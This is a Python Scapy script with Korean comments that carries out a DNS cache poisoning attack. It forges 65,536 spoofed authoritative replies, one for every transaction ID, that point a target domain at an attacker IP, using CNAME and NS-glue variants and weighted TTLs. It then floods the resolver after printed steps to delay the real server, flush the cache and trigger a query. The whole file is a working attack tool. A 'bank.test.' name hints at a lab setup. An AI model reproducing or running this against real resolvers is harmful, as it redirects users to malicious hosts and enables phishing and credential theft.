#!/usr/bin/env python3
from scapy.all import *
import os
import random
import sys
import time
from collections import Counter

# === [ 설정 단계 ] ===
def require_env(name):
    value = os.getenv(name)
    if not value:
        raise SystemExit(f"[!] Missing required environment variable: {name}")
    return value

RESOLVER_IP = require_env("RESOLVER_IP")
AUTH_SERVER_IP = require_env("AUTH_IP")
TARGET_DOMAIN = require_env("TARGET_DOMAIN")
FAKE_IP = require_env("FAKE_WEB_IP")
TARGET_PORT = int(require_env("RESOLVER_ATTACK_UDP_PORT"))
DNS_PORT = int(require_env("DNS_PORT"))
ATTACK_NS_NAME = require_env("ATTACK_NS_NAME")
TTL_POOL = [30, 60, 120, 300, 600, 1200, 3600, 7200, 21600, 43200, 86400]
TTL_WEIGHTS = [4, 5, 5, 8, 8, 8, 10, 10, 10, 16, 16]
RESPONSE_TEMPLATE_WEIGHTS = [
    ("a_only", 25),
    ("a_additional", 15),
    ("cname_a", 20),
    ("cname_a_additional", 10),
    ("a_authority", 20),
    ("a_authority_glue", 10),
]
RNG = random.Random()

def choose_weighted(weighted_items):
    items = [item for item, _ in weighted_items]
    weights = [weight for _, weight in weighted_items]
    return RNG.choices(items, weights=weights, k=1)[0]


def canonical_name():
    return f"edge.{TARGET_DOMAIN.rstrip('.')}."


def make_packet(txid, template_name=None, ttl=None):
    template_name = template_name or choose_weighted(RESPONSE_TEMPLATE_WEIGHTS)
    ttl = ttl if ttl is not None else RNG.choices(TTL_POOL, weights=TTL_WEIGHTS, k=1)[0]
    ip = IP(src=AUTH_SERVER_IP, dst=RESOLVER_IP)
    udp = UDP(sport=DNS_PORT, dport=TARGET_PORT)
    answer = DNSRR(rrname=TARGET_DOMAIN, type='A', rclass='IN', ttl=ttl, rdata=FAKE_IP)
    authority = None
    additional = None

    if template_name == "a_additional":
        additional = DNSRR(rrname=ATTACK_NS_NAME, type='A', rclass='IN', ttl=ttl, rdata=FAKE_IP)
    elif template_name in ("cname_a", "cname_a_additional"):
        alias = canonical_name()
        answer = (
            DNSRR(rrname=TARGET_DOMAIN, type='CNAME', rclass='IN', ttl=ttl, rdata=alias)
            / DNSRR(rrname=alias, type='A', rclass='IN', ttl=ttl, rdata=FAKE_IP)
        )
        if template_name == "cname_a_additional":
            additional = DNSRR(rrname=ATTACK_NS_NAME, type='A', rclass='IN', ttl=ttl, rdata=FAKE_IP)
    elif template_name == "a_authority":
        authority = DNSRR(rrname="bank.test.", type='NS', rclass='IN', ttl=ttl, rdata=ATTACK_NS_NAME)
    elif template_name == "a_authority_glue":
        authority = DNSRR(rrname="bank.test.", type='NS', rclass='IN', ttl=ttl, rdata=ATTACK_NS_NAME)
        additional = DNSRR(rrname=ATTACK_NS_NAME, type='A', rclass='IN', ttl=ttl, rdata=FAKE_IP)

    dns = DNS(
        id=txid,
        qr=1, aa=1, rd=1,
        qd=DNSQR(qname=TARGET_DOMAIN),
        an=answer,
        ns=authority,
        ar=additional,
    )
    return ip/udp/dns

def start_attack():
    print(f"[*] 목표 리졸버: {RESOLVER_IP} (Port: {TARGET_PORT})")
    
    # 1. 프리-로딩 단계 (패킷 리스트 생성)
    print(f"[*] [Step 1] 패킷 {65536} 개 생성 시작... 잠시만 기다려 주세요.")
    start_gen = time.time()
    
    templates = [choose_weighted(RESPONSE_TEMPLATE_WEIGHTS) for _ in range(65536)]
    ttls = [RNG.choices(TTL_POOL, weights=TTL_WEIGHTS, k=1)[0] for _ in range(65536)]
    pkts = [make_packet(txid, templates[txid], ttls[txid]) for txid in range(65536)]
    
    end_gen = time.time()
    print(f"[*] [Step 1] 생성 완료! (소요 시간: {end_gen - start_gen:.2f} 초)")
    print(f"[*] 현재 메모리에 {len(pkts)} 개의 패킷이 장전되었습니다.")
    print(f"[*] response templates: {dict(Counter(templates))}")
    print(f"[*] ttl distribution: {dict(sorted(Counter(ttls).items()))}")
    
    # 2. 대기 및 발사 단계
    print("\n" + "="*50)
    print("  [ 대기 중 ] 다른 터미널에서 아래 순서대로 진행하세요:")
    print("  1. 권한 서버 딜레이 설정 (예: tc delay 10s)")
    print("  2. 리졸버 캐시 초기화 (rndc flush)")
    print("  3. 리졸버에게 쿼리 전송 (dig @localhost ...)")
    print("="*50)
    
    input("\n[▶] dig 명령어를 날린 직후, 여기서 [Enter] 를 눌러 전송")

    # 3. 전송 실행
    print("[🔥] 포격 개시!")
    start_send = time.time()
    
    # inter=0 으로 설정하여 지연 없이 통으로 전송
    send(pkts, inter=0, verbose=0)
    
    end_send = time.time()
    elapsed = end_send - start_send
    print(f"\n[+] 전송 완료! (순수 전송 소요 시간: {elapsed:.2f} 초)")
    print(f"[*] 초당 전송 속도 (PPS): {len(pkts) / elapsed:.2f} pkts/s")

if __name__ == "__main__":
    if os.getuid() != 0:
        print("[!] 권한 에러: root (sudo) 권한으로 실행해 주세요.")
        sys.exit(1)
        
    start_attack()
